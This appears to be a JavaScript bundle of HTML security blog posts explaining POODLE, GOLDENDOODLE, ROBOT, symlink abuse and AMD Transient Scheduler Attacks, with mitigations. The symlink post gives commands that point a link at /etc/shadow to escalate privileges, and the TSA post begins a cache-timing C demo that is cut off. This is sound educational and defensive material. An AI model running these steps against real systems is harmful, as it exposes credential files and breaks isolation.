        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,kS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,LS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,PS=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,NS=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
